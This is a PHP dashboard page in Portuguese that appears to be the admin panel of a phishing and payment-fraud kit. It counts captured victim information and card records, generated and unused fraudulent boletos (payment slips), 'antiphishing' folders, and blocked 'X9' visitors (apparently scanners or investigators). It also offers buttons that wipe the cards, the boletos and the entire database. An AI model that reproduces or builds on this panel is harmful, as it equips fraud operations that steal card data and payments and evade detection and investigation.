<?php 
  
  $data['atual'] = date('Y-m-d H:i:s');
  $data['online'] = strtotime($data['atual'] . " - 20 seconds");
  $data['online'] = date("Y-m-d H:i:s",$data['online']);

?>

<div class="row bg-title">
    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
        <h4 class="page-title">Dashboard</h4> </div>
    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
        <ol class="breadcrumb">
            <li><a href="#">Home</a></li>
        </ol>
    </div>
    <!-- /.col-lg-12 -->
</div>
<!-- /.row -->
<!-- ============================================================== -->
<!-- Different data widgets -->
<!-- ============================================================== -->
<!-- .row -->
<div class="row">
    <div class="col-lg-4 col-sm-6 col-xs-12">
        <div class="white-box analytics-info">
            <h3 class="box-title">Visitas</h3>
            <ul class="list-inline two-part">
                <li>
                    <div id="sparklinedash"></div>
                </li>
                <li class="text-right"><i class="ti-arrow-up text-success"></i> <span class="counter text-success">
                    <?php $visitas = query("SELECT SUM(visitas) AS visitas FROM produtos"); $row_visitas = assoc($visitas); echo $row_visitas['visitas'];?>
                </span></li>
            </ul>
        </div>
    </div>
    <div class="col-lg-4 col-sm-6 col-xs-12">
        <div class="white-box analytics-info">
            <h3 class="box-title">Infos</h3>
            <ul class="list-inline two-part">
                <li>
                    <div id="sparklinedash2"></div>
                </li>
                <li class="text-right"><i class="ti-arrow-up text-purple"></i> <span class="counter text-purple">
                    <?php echo row("SELECT * FROM infos"); ?>
                </span></li>
            </ul>
        </div>
    </div>
    <div class="col-lg-4 col-sm-6 col-xs-12">
        <div class="white-box analytics-info">
            <h3 class="box-title">Boletos</h3>
            <ul class="list-inline two-part">
                <li>
                    <div id="sparklinedash3"></div>
                </li>
                <li class="text-right"><i class="ti-arrow-up text-info"></i> <span class="counter text-info">
                    <?php echo row("SELECT * FROM info_boleto"); ?>
                </span></li>
            </ul>
        </div>
    </div>
</div>
<!--/.row -->
<!--row -->
<!-- /.row -->
<div class="row">
    <div class="col-md-12 col-lg-12 col-sm-12 col-xs-12">
        <div class="white-box">
            <table class="table table-bordered">
              <tbody>
                <tr>
                  <td class="bg-info" style="color: #fff;">Estatísticas</td>
                </tr>
                <tr>
                  <td>Infos capturadas
                  	<span class="informacoes"><?php echo row("SELECT * FROM infos"); ?></span>
                  	<a class="informacoes" href="index.php?adminunlocked&page=infos">Visualizar infos</a>
                  </td>
                </tr>
                <tr>
                  <td>Boletos gerados
                  	<span class="informacoes"><?php echo row("SELECT * FROM info_boleto"); ?></span>
                  	<a class="informacoes" href="index.php?adminunlocked&page=boletos">Visualizar boletos</a>
                  </td>
                </tr>
                <tr>
                  <td>Boletos virgens
                    <span class="informacoes"><?php echo row("SELECT * FROM boletos WHERE gerado = 0"); ?></span>
                    <a class="informacoes" href="index.php?adminunlocked&page=boletos">Visualizar boletos</a>
                  </td>
                </tr>
                <tr>
                  <td>Pastas no antiphishing
                  	<span class="informacoes"><?php echo row("SELECT * FROM antiphishing"); ?></span>
                  </td>
                </tr>
                <tr>
                  <td>Produtos cadastrados
                  	<span class="informacoes"><?php echo row("SELECT * FROM produtos"); ?></span>
                  	<a class="informacoes" href="index.php?adminunlocked&page=produtos">Visualizar produtos</a>
                  </td>
                </tr>
                <tr>
                  <td>X9 bloqueados
                  	<span class="informacoes"><?php echo row("SELECT * FROM x9"); ?></span>
                  	<a class="informacoes" href="index.php?adminunlocked&page=x9">Visualizar X9</a>
                  </td>
                </tr>
              </tbody>
            </table>

            <table class="table table-bordered">
              <tbody>
                <tr>
                  <td class="bg-info" style="color: #fff;">Limpeza de sistema</td>
                </tr>
                <tr>
                  <td>Cartões<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="infos">Limpar</button></td>
                </tr>
                <tr>
                  <td>Boletos<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="boletos">Limpar</button></td>
                </tr>
                <tr>
                  <td>Visitas<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="visitas">Limpar</button></td>
                </tr>
                <tr>
                  <td>Produtos<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="produtos">Limpar</button></td>
                </tr>
                <tr>
                  <td>Pastas do antiphishing<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="antiphishing">Limpar</button></td>
                </tr>
                <tr>
                  <td>X9 bloqueados<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="x9">Limpar</button></td>
                </tr>
                <tr>
                  <td>Banco de dados<button style="margin-top:-10px;margin-bottom:-10px;" type="button" class="informacoes" data-toggle="modal" data-target="#exampleModal" data-whatever="bd">Limpar</button></td>
                </tr>
              </tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Limpar</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        Deseja realmente executar essa ação?
        <div id="result"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
        <button type="button" class="btn btn-primary" id="limpar">Limpar</button>
      </div>
    </div>
  </div>
</div>

<script>
    $('#exampleModal').on('show.bs.modal', function (event) {
      var button = $(event.relatedTarget);
      var recipient = button.data('whatever');

      $('document').ready(function(){
        $('#limpar').click(function(){
            $.ajax({
                method: "POST",
                url: 'pages/limpar-sistema.php',
                data: {
                    qual: recipient
                },beforeSend: function(){
                    $('#result').html('<center><img width="50px" src="img/loading.gif"/></center>');
                }
            }).done(function(result){
                $('#result').html(result);
            });
        });
      });
    })
</script>